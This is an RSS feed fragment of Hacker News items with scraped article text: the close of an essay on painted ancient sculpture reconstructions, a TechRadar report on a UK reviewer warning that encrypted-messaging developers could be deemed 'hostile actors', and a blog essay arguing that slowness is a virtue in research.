                <p>
                  Enrique Íñiguez Rodríguez via Wikimedia Commons.
                </p>
              </div>
            </div>
          </figcaption>
        </figure></div>


<p>One wonders if something else is going on here. The enormous public interest generated by garish reconstructions is surely because of and not in spite of their ugliness. It is hard to believe that this is entirely accidental. One possibility is that the reconstructors are engaged in a kind of trolling. In this interpretation, they know perfectly well that ancient sculptures did not look like the reconstructions, and probably included the subtle variation of color tones that ancient paintings did. But they fail to correct the belief that people naturally form given what is placed before them: that the proffered reconstruction of ancient sculpture is roughly what ancient sculpture actually looked like.</p>


<div>
<figure><img loading="lazy" src="https://wip.gatspress.com/wp-content/uploads/2025/12/image-12.jpeg" width="-182" height="-257" sizes="(max-width: 527px) 100vw, 527px" srcset="https://wip.gatspress.com/wp-content/uploads/2025/12/image-12.jpeg 527w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-12-213x300.jpeg 213w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-12-402x568.jpeg 402w, https://wip.gatspress.com/wp-content/uploads/2025/12/image-12-462x652.jpeg 462w" alt="A painted Doric entablature, as reconstructed by a German illustrator in the 1880s. How come the color looks really good here?">
          <figcaption>
            <div>
              <p>
                A painted Doric entablature, as reconstructed by a German illustrator in the 1880s. How come the color looks really good here?
              </p>
              <div>
                <p>Image</p>
                <p>
                  Wikimedia Commons.
                </p>
              </div>
            </div>
          </figcaption>
        </figure></div>


<p>It is a further question whether such trolling would be deeply objectionable. Brinkmann has produced a massively successful exhibition, which has more than accomplished its aim of making the fact that ancient statues were painted more widely known. The reconstructions&nbsp;are often very funny and are not all as bad as the best-known examples.<sup id="ref-3"></sup> There is genuine intellectual value in the project and what could be seen as mean-spirited iconoclasm could equally be embraced as harmless fun.</p>



<p>On the other hand, at a time when trust in the honest intentions of experts is at a low, it may be unwise for experts to troll the public.</p>
</div></article><div><div id="reference-item-1"><p>1</p><p><span>Note how easily the statue of a pagan god in </span><a href="https://www.jstor.org/stable/community.24340275?searchText=Roman+Painting&amp;searchUri=%2Faction%2FdoBasicSearch%3FQuery%3DRoman%2BPainting%26image_search_referrer%3Dglobal%26so%3Drel%26searchkey%3D1743961432056%26ed%3D600%26pagemark%3DeyJwYWdlIjoxNCwic3RhcnQiOjMyNSwidG90YWwiOjY3MDZ9&amp;ab_segments=0%2Fbasic_image_search%2Fcontrol&amp;refreqid=fastly-default%3A1f19b43570e13771515e989daccb3ed8&amp;searchkey=1743961432056"><span>the fresco</span></a><span> at the House of the Surgeon in Pompeii, mentioned above, might serve in place of a medieval devotional statue like </span><a href="https://www.jstor.org/stable/community.26439692?searchText=Medieval+painted+statue&amp;searchUri=%2Faction%2FdoBasicSearch%3FQuery%3DMedieval%2Bpainted%2Bstatue%26image_search_referrer%3Dglobal%26so%3Drel%26searchkey%3D1744393658060%26doi%3D10.2307%252Fcommunity.26439692&amp;ab_segments=0%2Fbasic_image_search%2Fcontrol&amp;refreqid=fastly-default%3Aff257901646e999d2456c594a0378c0f&amp;searchkey=1744393658060"><span>this St Anthony</span></a><span> – something Brinkmann’s reconstructions could never do.</span></p></div><div id="reference-item-2"><p>2</p><p><span>The reconstructed </span><a href="https://www.dailyartmagazine.com/wp-content/uploads/2022/09/New-Phototastic-Collage-1024x1024-1.webp"><span>Venus Lovatelli</span></a><span> is rather lovely. It is no coincidence that this is based on an original whose color scheme has survived unusually well, minimizing the opportunity for mischief.</span></p></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Creating apps like Signal could be 'hostile activity' claims UK watchdog (401 pts)]]></title>
            <link>https://www.techradar.com/vpn/vpn-privacy-security/creating-apps-like-signal-or-whatsapp-could-be-hostile-activity-claims-uk-watchdog</link>
            <guid>46311355</guid>
            <pubDate>Thu, 18 Dec 2025 11:21:15 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.techradar.com/vpn/vpn-privacy-security/creating-apps-like-signal-or-whatsapp-could-be-hostile-activity-claims-uk-watchdog">https://www.techradar.com/vpn/vpn-privacy-security/creating-apps-like-signal-or-whatsapp-could-be-hostile-activity-claims-uk-watchdog</a>, See on <a href="https://news.ycombinator.com/item?id=46311355">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-widget-type="contentparsed" id="content">
<section>
<div>
<div>
<picture data-new-v2-image="true">
<source type="image/webp" srcset="https://cdn.mos.cms.futurecdn.net/zjaJ25xrgFNLKEHr8bjVcY-1920-80.jpg.webp 1920w, https://cdn.mos.cms.futurecdn.net/zjaJ25xrgFNLKEHr8bjVcY-1200-80.jpg.webp 1200w, https://cdn.mos.cms.futurecdn.net/zjaJ25xrgFNLKEHr8bjVcY-1024-80.jpg.webp 1024w, https://cdn.mos.cms.futurecdn.net/zjaJ25xrgFNLKEHr8bjVcY-970-80.jpg.webp 970w, https://cdn.mos.cms.futurecdn.net/zjaJ25xrgFNLKEHr8bjVcY-650-80.jpg.webp 650w, https://cdn.mos.cms.futurecdn.net/zjaJ25xrgFNLKEHr8bjVcY-480-80.jpg.webp 480w, https://cdn.mos.cms.futurecdn.net/zjaJ25xrgFNLKEHr8bjVcY-320-80.jpg.webp 320w" sizes="(min-width: 1000px) 600px, calc(100vw - 40px)">
<img src="https://cdn.mos.cms.futurecdn.net/zjaJ25xrgFNLKEHr8bjVcY.jpg" alt="WhatsApp and Signal app icons" srcset="https://cdn.mos.cms.futurecdn.net/zjaJ25xrgFNLKEHr8bjVcY-1920-80.jpg 1920w, https://cdn.mos.cms.futurecdn.net/zjaJ25xrgFNLKEHr8bjVcY-1200-80.jpg 1200w, https://cdn.mos.cms.futurecdn.net/zjaJ25xrgFNLKEHr8bjVcY-1024-80.jpg 1024w, https://cdn.mos.cms.futurecdn.net/zjaJ25xrgFNLKEHr8bjVcY-970-80.jpg 970w, https://cdn.mos.cms.futurecdn.net/zjaJ25xrgFNLKEHr8bjVcY-650-80.jpg 650w, https://cdn.mos.cms.futurecdn.net/zjaJ25xrgFNLKEHr8bjVcY-480-80.jpg 480w, https://cdn.mos.cms.futurecdn.net/zjaJ25xrgFNLKEHr8bjVcY-320-80.jpg 320w" sizes="(min-width: 1000px) 600px, calc(100vw - 40px)" data-new-v2-image="true" data-original-mos="https://cdn.mos.cms.futurecdn.net/zjaJ25xrgFNLKEHr8bjVcY.jpg" data-pin-media="https://cdn.mos.cms.futurecdn.net/zjaJ25xrgFNLKEHr8bjVcY.jpg" data-pin-nopin="true" fetchpriority="high">
</picture>
</div>
<figcaption>
<span>(Image credit: Michele Ursi / Shutterstock)</span>
</figcaption>
</div>
<div id="article-body">

<hr id="08a96fae-3168-4aa8-a240-3c7c795865f3"><ul id="4835e0bb-7e10-4625-bba4-a68465e272ed"><li><strong>Encrypted messaging developers may be considered hostile actors in the UK</strong></li><li><strong>An independent review of national security law warns of overreach </strong></li><li><strong>Encryption repeatedly targeted by UK lawmakers </strong></li></ul><hr id="d0446557-3ed4-42aa-ad16-b21bc874733a"><p id="635fc126-2793-403b-8e3c-6df60d61901e">Developers of apps that use end-to-end encryption to protect private communications could be considered hostile actors in the UK.</p><p>That is the stark warning from Jonathan Hall KC, the government’s Independent Reviewer of State Threats Legislation and Independent Reviewer of Terrorism Legislation, in a new <a data-analytics-id="inline-link" href="https://assets.publishing.service.gov.uk/media/69411a3eadb5707d9f33d7e8/E03512978_-_Un-Act_The_National_Security_Act_in_2024_Accessible.pdf" target="_blank" data-url="https://assets.publishing.service.gov.uk/media/69411a3eadb5707d9f33d7e8/E03512978_-_Un-Act_The_National_Security_Act_in_2024_Accessible.pdf" referrerpolicy="no-referrer-when-downgrade" data-hl-processed="none" data-mrf-recirculation="inline-link">report</a> on national security laws.</p><p id="635fc126-2793-403b-8e3c-6df60d61901e-2">In his independent review of the Counter-Terrorism and Border Security Act and the newly implemented National Security Act, Hall KC highlights the incredibly broad scope of powers granted to authorities.</p><p>He warns that developers of apps like Signal and WhatsApp could technically fall within the legal definition of "hostile activity" simply because their technology "make[s] it more difficult for UK security and intelligence agencies to monitor communications."</p><p>He writes: "It is a reasonable assumption that this would be in the interests of a foreign state even if though the foreign state has never contemplated this potential advantage."</p><p>The report also notes that journalists "carrying confidential information" or material "personally embarrassing to the Prime Minister on the eve of important treaty negotiations" could face similar scrutiny.</p><p>While it remains to be seen how this report will influence future amendments, it comes at a time of increasing pressure from lawmakers against encryption.</p><h2 id="encryption-under-siege-3">Encryption under siege</h2><figure data-bordeaux-image-check="" id="0f9976de-bb5c-4835-99ca-8b29b2da36b4"><div><p> <picture data-new-v2-image="true">
<source type="image/webp" srcset="https://cdn.mos.cms.futurecdn.net/6SM8zxijck2x6Yozxtwsj7-1200-80.jpg.webp 1200w, https://cdn.mos.cms.futurecdn.net/6SM8zxijck2x6Yozxtwsj7-1024-80.jpg.webp 1024w, https://cdn.mos.cms.futurecdn.net/6SM8zxijck2x6Yozxtwsj7-970-80.jpg.webp 970w, https://cdn.mos.cms.futurecdn.net/6SM8zxijck2x6Yozxtwsj7-650-80.jpg.webp 650w, https://cdn.mos.cms.futurecdn.net/6SM8zxijck2x6Yozxtwsj7-480-80.jpg.webp 480w, https://cdn.mos.cms.futurecdn.net/6SM8zxijck2x6Yozxtwsj7-320-80.jpg.webp 320w" sizes="(min-width: 1000px) 970px, calc(100vw - 40px)">
<img src="https://cdn.mos.cms.futurecdn.net/6SM8zxijck2x6Yozxtwsj7.jpg" alt="Conceptual image of a large group of cctv camera watching and spying on a mobile phone with messages, it illustrates digital surveillance concept" srcset="https://cdn.mos.cms.futurecdn.net/6SM8zxijck2x6Yozxtwsj7-1200-80.jpg 1200w, https://cdn.mos.cms.futurecdn.net/6SM8zxijck2x6Yozxtwsj7-1024-80.jpg 1024w, https://cdn.mos.cms.futurecdn.net/6SM8zxijck2x6Yozxtwsj7-970-80.jpg 970w, https://cdn.mos.cms.futurecdn.net/6SM8zxijck2x6Yozxtwsj7-650-80.jpg 650w, https://cdn.mos.cms.futurecdn.net/6SM8zxijck2x6Yozxtwsj7-480-80.jpg 480w, https://cdn.mos.cms.futurecdn.net/6SM8zxijck2x6Yozxtwsj7-320-80.jpg 320w" sizes="(min-width: 1000px) 970px, calc(100vw - 40px)" loading="lazy" data-new-v2-image="true" data-original-mos="https://cdn.mos.cms.futurecdn.net/6SM8zxijck2x6Yozxtwsj7.jpg" data-pin-media="https://cdn.mos.cms.futurecdn.net/6SM8zxijck2x6Yozxtwsj7.jpg">
</picture></p></div><figcaption itemprop="caption description"><span itemprop="copyrightHolder">(Image credit: Getty Images)</span></figcaption></figure><p id="51400f0c-4669-4af0-a5d5-35926cc553c6">While the report’s strong wording may come as a shock, it doesn't exist in a vacuum. Encrypted apps are increasingly in the crosshairs of UK lawmakers, with several pieces of legislation targeting the technology.</p><p>Most notably, Apple was served with a technical capability notice under the Investigatory Powers Act (IPA) demanding it weaken the encryption protecting iCloud data. That legal standoff led the tech giant to disable its Advanced Data Protection <a data-analytics-id="inline-link" href="https://www.techradar.com/computing/cyber-security/we-will-never-build-a-backdoor-apple-kills-its-iclouds-end-to-end-encryption-feature-in-the-uk" data-mrf-recirculation="inline-link" data-before-rewrite-localise="https://www.techradar.com/computing/cyber-security/we-will-never-build-a-backdoor-apple-kills-its-iclouds-end-to-end-encryption-feature-in-the-uk">instead of creating a backdoor</a>.</p><p>The Online Safety Act is already well known for its controversial age verification requirements. However, its most contentious provisions have yet to be fully implemented, and experts fear these could <a data-analytics-id="inline-link" href="https://www.techradar.com/vpn/vpn-privacy-security/the-online-safety-act-isnt-just-about-age-verification-end-to-end-encryption-is-also-at-risk" data-mrf-recirculation="inline-link" data-before-rewrite-localise="https://www.techradar.com/vpn/vpn-privacy-security/the-online-safety-act-isnt-just-about-age-verification-end-to-end-encryption-is-also-at-risk">undermine encryption</a> even further.</p><p>On Monday, <a data-analytics-id="inline-link" href="https://www.techradar.com/vpn/vpn-privacy-security/to-repeal-or-not-repeal-uk-parliament-discusses-the-online-safety-act" data-mrf-recirculation="inline-link" data-before-rewrite-localise="https://www.techradar.com/vpn/vpn-privacy-security/to-repeal-or-not-repeal-uk-parliament-discusses-the-online-safety-act">Parliament debated the Act</a> following a petition calling for its repeal. Instead of rolling back the law, however, <a data-analytics-id="inline-link" href="https://www.techradar.com/vpn/vpn-privacy-security/uk-mps-target-vpns-in-latest-online-safety-act-debate" data-mrf-recirculation="inline-link" data-before-rewrite-localise="https://www.techradar.com/vpn/vpn-privacy-security/uk-mps-target-vpns-in-latest-online-safety-act-debate">MPs pushed for stricter enforcement</a>. During the discussion, lawmakers specifically called for a review of other encrypted tools, like the <a data-analytics-id="inline-link" href="https://www.techradar.com/vpn/best-vpn" data-mrf-recirculation="inline-link" data-before-rewrite-localise="https://www.techradar.com/vpn/best-vpn">best VPNs</a>.</p><p id="a39c9f70-9c09-4a78-84bb-a0f3644c03a8">The potential risks of the Act's tougher stance on encryption were only briefly mentioned during the discussion, suggesting a stark disconnect between MPs and security experts.</p><p>Olivier Crépin-Leblond, of the Internet Society, told TechRadar he was disappointed by the outcome of the debate. "When it came to Client Side Scanning (CSS), most felt this could be one of the 'easy technological fixes' that could help law enforcement greatly, especially when they showed their frustration at Facebook rolling end-to-end encryption," he said.</p><p>"It's clearly not understood that any such software could fall prey to hackers."</p><p>It is clear that for many lawmakers, <a data-analytics-id="inline-link" href="https://www.techradar.com/vpn/what-is-encryption" data-mrf-recirculation="inline-link" data-before-rewrite-localise="https://www.techradar.com/vpn/what-is-encryption">encryption</a> is viewed primarily as an obstacle to law enforcement. This stands in sharp contrast to the view of digital rights experts, who stress that the technology is vital for protecting privacy and security in an online landscape where cyberattacks are rising.</p><p>"The government signposts end-to-end encryption as a threat, but what they fail to consider is that breaking it would be a threat to our national security too," Jemimah Steinfeld, CEO of Index on Censorship, told TechRadar.</p><p>She also added that this ignores encryption's vital role for dissidents, journalists, and domestic abuse victims, "not to mention the general population who should be afforded basic privacy."</p><p>With the battle lines drawn, we can expect a challenging year ahead for services like Signal and WhatsApp. Both companies have previously <a data-analytics-id="inline-link" href="https://www.techradar.com/computing/cyber-security/we-will-not-walk-back-signal-would-rather-leave-the-uk-and-sweden-than-remove-encryption-protections" data-mrf-recirculation="inline-link" data-before-rewrite-localise="https://www.techradar.com/computing/cyber-security/we-will-not-walk-back-signal-would-rather-leave-the-uk-and-sweden-than-remove-encryption-protections">pledged to leave the UK market</a> rather than compromise their users' privacy and security.</p><hr id="8a971148-d155-4c6b-8674-991e17b84f0b"><p id="e3ea0db0-4dda-45c6-bde9-c0378b0a11b0"><a data-analytics-id="inline-link" href="https://news.google.com/publications/CAAqKAgKIiJDQklTRXdnTWFnOEtEWFJsWTJoeVlXUmhjaTVqYjIwb0FBUAE?hl=en-GB&amp;gl=GB&amp;ceid=GB%3Aen" target="_blank" data-url="https://news.google.com/publications/CAAqKAgKIiJDQklTRXdnTWFnOEtEWFJsWTJoeVlXUmhjaTVqYjIwb0FBUAE?hl=en-GB&amp;gl=GB&amp;ceid=GB%3Aen" referrerpolicy="no-referrer-when-downgrade" data-hl-processed="none" data-mrf-recirculation="inline-link"><em><strong>Follow TechRadar on Google News</strong></em></a> and<em> </em><a data-analytics-id="inline-link" href="https://www.google.com/preferences/source?q=techradar.com" target="_blank" data-url="https://www.google.com/preferences/source?q=techradar.com" referrerpolicy="no-referrer-when-downgrade" data-hl-processed="none" data-mrf-recirculation="inline-link"><em><strong>add us as a preferred source</strong></em></a><em> to get our expert news, reviews, and opinion in your feeds. Make sure to click the Follow button!</em></p><hr id="02ae0dcd-6a1b-47f9-a3aa-48554e0b9ffe">
</div>




<div id="slice-container-authorBio-hY6372mqFAwZKNk4RYWyjK"><p>Chiara is a multimedia journalist committed to covering stories to help promote the rights and denounce the abuses of the digital side of life – wherever cybersecurity, markets, and politics tangle up. She believes an open, uncensored, and private internet is a basic human need and wants to use her knowledge of VPNs to help readers take back control. She writes news, interviews, and analysis on data privacy, online censorship, digital rights, tech policies, and security software, with a special focus on VPNs, for TechRadar and TechRadar Pro. Got a story, tip-off, or something tech-interesting to say? Reach out to chiara.castro@futurenet.com</p></div>
</section>

<div x-show="$store.Viafoura.showWidgets" x-cloak="" data-component-name="Viafoura:Comments" x-data="ViafouraComments('300px')" data-nosnippet="" data-community-guidelines-text="<p class='vfcustom-community-guidelines'>Please follow our <a href=&quot;https://www.techradar.com/news/about-us#section-community-guidelines&quot; target=&quot;_blank&quot;>community guidelines</a>.</p>">
<p>You must confirm your public display name before commenting</p>
<p>Please logout and then login again, you will then be prompted to enter your display name.</p>
</div>


</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Slowness is a virtue (234 pts)]]></title>
            <link>https://blog.jakobschwichtenberg.com/p/slowness-is-a-virtue</link>
            <guid>46311092</guid>
            <pubDate>Thu, 18 Dec 2025 10:44:29 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.jakobschwichtenberg.com/p/slowness-is-a-virtue">https://blog.jakobschwichtenberg.com/p/slowness-is-a-virtue</a>, See on <a href="https://news.ycombinator.com/item?id=46311092">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><article><div dir="auto"><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/$s_!2aZL!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F546e1fa0-75ba-4bfe-a850-00f9193b3e46_2900x1612.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/$s_!2aZL!,w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F546e1fa0-75ba-4bfe-a850-00f9193b3e46_2900x1612.png 424w, https://substackcdn.com/image/fetch/$s_!2aZL!,w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F546e1fa0-75ba-4bfe-a850-00f9193b3e46_2900x1612.png 848w, https://substackcdn.com/image/fetch/$s_!2aZL!,w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F546e1fa0-75ba-4bfe-a850-00f9193b3e46_2900x1612.png 1272w, https://substackcdn.com/image/fetch/$s_!2aZL!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F546e1fa0-75ba-4bfe-a850-00f9193b3e46_2900x1612.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/$s_!2aZL!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F546e1fa0-75ba-4bfe-a850-00f9193b3e46_2900x1612.png" width="1456" height="809" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/546e1fa0-75ba-4bfe-a850-00f9193b3e46_2900x1612.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:809,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:7331728,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:false,&quot;topImage&quot;:true,&quot;internalRedirect&quot;:&quot;https://blog.jakobschwichtenberg.com/i/181970009?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F546e1fa0-75ba-4bfe-a850-00f9193b3e46_2900x1612.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null,&quot;offset&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/$s_!2aZL!,w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F546e1fa0-75ba-4bfe-a850-00f9193b3e46_2900x1612.png 424w, https://substackcdn.com/image/fetch/$s_!2aZL!,w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F546e1fa0-75ba-4bfe-a850-00f9193b3e46_2900x1612.png 848w, https://substackcdn.com/image/fetch/$s_!2aZL!,w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F546e1fa0-75ba-4bfe-a850-00f9193b3e46_2900x1612.png 1272w, https://substackcdn.com/image/fetch/$s_!2aZL!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F546e1fa0-75ba-4bfe-a850-00f9193b3e46_2900x1612.png 1456w" sizes="100vw" fetchpriority="high"></picture></div></a></figure></div><p>Modern culture is focused exclusively on questions that can be answered quickly.</p><p>In academia, that’s what you can get funding for. Fast questions can be answered within a few weeks. You can then publish a paper. You can start collecting citations. You can present your answer at conferences. This is how you build a career.</p><p>But the most important questions can’t be answered like that.</p><p>When you can write down a step-by-step plan for how you’re going to answer a question or solve a specific problem, you aren’t doing research but development. </p><p><span>Research means you only have a fuzzy idea of your destination but no clear idea of how you’re going to get there. You’re mostly just following hunches and intuitions. </span><a href="https://blog.jakobschwichtenberg.com/p/against-objectives-or-how-einstein" rel="">That’s how the biggest leaps forward are achieved.</a></p><p>Development is the execution of a map toward a goal while research is the pursuit of a goal without a map.</p><p>Working on questions you can answer fast means you know what you’re doing. And knowing what you’re doing is a sign you’re not pushing into genuinely new territory.</p><p>Slowness allows for the exploration of uncharted territory and unexpected discoveries. Johann Friedrich Böttger spent almost a decade trying to find a formula that produces gold. While he never succeeded, a byproduct of his relentless experimentation was the discovery of a process to produce porcelain. </p><p>Andrew Wiles worked in secret for 7 years on Fermat’s Last Theorem, publishing nothing. It took Einstein around ten years to write down the foundational equation of General Relativity. </p><p><span>In this sense, when it comes to research, speed should be considered an anti-signal and slowness a virtue.</span><span data-state="closed"><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-1-181970009" href="https://blog.jakobschwichtenberg.com/p/slowness-is-a-virtue#footnote-1-181970009" target="_self" rel="">1</a></span></p><p>Our very definition of intelligence encodes the bias toward speed. The modern definition of intelligence is extremely narrow. It simply describes the speed at which you can solve well-defined problems.</p><p><span>Consider this: if you get access to an IQ test weeks in advance, you could slowly work through all the problems and memorize the solutions. The test would then score you as a genius. This reveals what IQ tests actually measure. It’s not whether you </span><em>can</em><span> solve problems, but how </span><em>fast</em><span> you solve them.</span></p><p>And it’s exclusively this kind of intelligence that’s measured in academic and IQ tests.</p><p><span>What these tests completely miss is the ability to select problems worth working on and to </span><a href="https://blog.jakobschwichtenberg.com/p/the-unreasonable-effectiveness-of" rel="">choose interesting steps forward in the absence of a well-defined problem</a><span>.</span></p><p>As a result, many people live under the illusion that because their intelligence doesn’t fit this narrow definition, they’re not able to contribute something meaningful.</p><p><span>As the saying goes, “</span><em>if you judge a fish by its ability to climb a tree, it will live its whole life believing that it is stupid</em><span>”.</span></p><p><span>So where does this obsession with IQ come from? </span><a href="https://www.theintrinsicperspective.com/p/your-iq-isnt-160-no-ones-is" rel="">Partly from bad science that got repeated until it became truth.</a><span> In the 1950s, a Harvard professor named Anne Roe claimed to have measured the IQs of Nobel Prize winners, reporting a median of 166. The finding has been cited ever since. But here’s what actually happened: she never used a real IQ test. She made up her own test from SAT questions, had no comparison group, and when the Nobel laureates took it, they scored... average. Not genius-level. Just fine. She then performed a mysterious statistical conversion to arrive at 166. The raw data showed nothing exceptional. But the inflated number is what survived.</span></p><p>Einstein never took an IQ test, but his school records show a B+ student who failed his college entrance exam on the first try. The numbers you see cited are invented. And the few geniuses we do have data on, like Richard Feynman, scored a “mere” 125. </p><p>In fact, it’s not hard to imagine how raw processing speed can be counterproductive. People who excel at quickly solving well-defined problems tend to gravitate toward... well-defined problems. They choose what to work on based on what they’re good at, not necessarily what’s worth doing.</p><p>Consider Marilyn vos Savant, listed in the Guinness Book of World Records for the highest recorded IQ. What does she do with it? She writes a puzzle column for Parade magazine.</p><p><span>Slow thinkers, on the other hand, have an easier time ignoring legible problems. They’re not constantly tempted by technical puzzles they know they could solve.</span><span data-state="closed"><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-2-181970009" href="https://blog.jakobschwichtenberg.com/p/slowness-is-a-virtue#footnote-2-181970009" target="_self" rel="">2</a></span></p><p>The obsession with processing speed creates a systemic filter. Because we measure intelligence by how quickly one can reach a known finish line, we exclusively fund the ‘sprinters.’ But if you are a sprinter, you have no incentive to wander into the trackless wilderness of true research where speed is irrelevant because the direction is unknown.</p><p><span>At the same time, ‘sprinters’ rise to leadership and design institutions that reward the same legibility they excel at. Over time, our institutions have become nothing but a </span><a href="https://blog.jakobschwichtenberg.com/p/what-scientific-ideas-are-worth-pursuing" rel="">series of well-manicured running tracks</a><span>. By rewarding those who can write down and finish well-explained plans the fastest, we have built a world that has no room for anyone who doesn’t yet have a plan.</span></p><p>Legibility and speed are connected. Well-defined problems come with clear milestones, measurable progress, and recognizable success. They’re easy to explain to funding committees, to put on a CV, to defend in casual conversations.</p><p><span>But, as </span><a href="https://substack.com/@michaelnielsen1/note/c-179765154" rel="">Michael Nielsen put it</a><span>: “</span><em>the most significant creative work is illegible to existing institutions, and so almost unfundable. There is a grain of truth to Groucho’s Law: you should never work on any project for which you can get funding.</em><span>” </span></p><p>Because if it’s fundable, it means the path is already clear enough that it will happen anyway. You’re not needed there.</p><p>Many people abandon interesting problems because they don’t know how to defend them and how to lay out a legible path forward. When someone asks “what are you working on?” they need an answer that immediately makes sense. When people ask “how’s it going?” they need visible progress to report. The illegible path offers neither. So most people switch to something they can explain.</p><p><span>And this is how modern institutions crush slow thinkers. Through thousand small moments the illegible path becomes socially unbearable.</span><span data-state="closed"><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-3-181970009" href="https://blog.jakobschwichtenberg.com/p/slowness-is-a-virtue#footnote-3-181970009" target="_self" rel="">3</a></span></p><p>So here is a question worth sitting with: What problem would you work on if you could delete “legible progress within the next ten years” from your list of requirements? </p></div></article></div><div><div id="discussion"><h4>Discussion about this post</h4></div><div><h3>Ready for more?</h3></div></div></div>]]></description>
        </item>
    </channel>
</rss>